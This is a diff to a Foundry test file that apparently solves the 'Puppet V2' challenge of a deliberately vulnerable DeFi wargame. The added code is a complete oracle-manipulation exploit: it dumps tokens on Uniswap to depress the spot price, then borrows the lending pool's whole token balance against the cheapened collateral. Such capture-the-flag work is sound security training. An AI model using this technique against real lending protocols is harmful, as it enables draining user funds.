@@ -98,7 +98,28 @@ contract PuppetV2Challenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_puppetV2() public checkSolvedByPlayer {
-        
+        // 1. Dump DVT on Uniswap to crash the oracle price
+        address[] memory path = new address[](2);
+        path[0] = address(token);
+        path[1] = address(weth);
+
+        token.approve(address(uniswapV2Router), PLAYER_INITIAL_TOKEN_BALANCE);
+        uniswapV2Router.swapExactTokensForETH(
+            PLAYER_INITIAL_TOKEN_BALANCE,
+            0,
+            path,
+            player,
+            block.timestamp
+        );
+
+        // 2. Wrap ETH to WETH and borrow all DVT from the pool
+        uint256 depositRequired = lendingPool.calculateDepositOfWETHRequired(POOL_INITIAL_TOKEN_BALANCE);
+        weth.deposit{value: depositRequired}();
+        weth.approve(address(lendingPool), depositRequired);
+        lendingPool.borrow(POOL_INITIAL_TOKEN_BALANCE);
+
+        // 3. Transfer borrowed DVT to recovery
+        token.transfer(recovery, POOL_INITIAL_TOKEN_BALANCE);
     }
 
     /**
